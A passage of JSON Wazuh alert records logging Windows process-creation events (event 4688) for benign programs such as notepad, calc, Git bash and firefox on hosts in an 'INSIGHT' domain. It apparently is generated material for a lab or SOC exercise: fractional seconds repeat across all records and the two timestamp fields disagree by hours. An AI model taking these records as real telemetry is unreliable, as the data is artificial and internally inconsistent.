            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "alice",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x8a769"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "05bc480a-afa7-43e1-b501-54d0e81cfcd9",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T10:30:36.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T00:05:55.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x63e44"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "81c47dd6-50fc-437e-b58a-2294f0ebdd56",
    "_source": {
      "agent": {
        "ip": "172.16.10.20",
        "name": "FS01",
        "id": "003"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T06:27:18.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T16:15:46.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x9a3e7"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "0ad4f321-60b2-4be4-bbb7-631cafaad293",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T07:42:07.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T03:45:49.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "david",
            "newProcessName": "C:\\Program Files\\Git\\bin\\bash.exe",
            "parentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x15fad"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "68f41040-f835-4fff-b22d-7f8b5114c711",
    "_source": {
      "agent": {
        "ip": "172.16.30.17",
        "name": "DB01",
        "id": "010"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T12:30:50.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T21:48:13.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "alice",
            "newProcessName": "C:\\Program Files\\Git\\bin\\bash.exe",
            "parentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x74aca"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "ce048de1-ebd2-4f03-969c-d685ad85d51f",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T13:48:03.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T15:58:12.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x5cd9f"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "1f419d61-0b2b-4447-a6f8-3b8984b481d8",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T03:50:50.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T16:21:40.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "david",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x7eac8"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "d22108c6-ae49-4b09-85be-5412fa496c74",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T04:07:02.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T07:47:20.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Program Files\\Git\\bin\\bash.exe",
            "parentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x64592"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "be657f49-888d-4979-bdfe-d198570bf957",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T01:15:29.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T18:05:35.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "david",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x22d5c"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "c919e0ff-3bb2-450d-a416-beaf26f0e475",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T17:05:53.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T13:48:32.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x757bd"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "a31597c3-ef5a-4f31-aaea-03d8e1bbb6b8",
    "_source": {
      "agent": {
        "ip": "172.16.10.20",
        "name": "FS01",
        "id": "003"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T04:15:40.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T03:52:13.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x9b8f3"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "60feabb4-3d33-435e-8cd3-f8fe5d1545eb",
    "_source": {
      "agent": {
        "ip": "172.16.200.50",
        "name": "SCDC01",
        "id": "005"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T20:02:39.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:51:27.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x13b7b"
          }
        }
      }
    }
  },
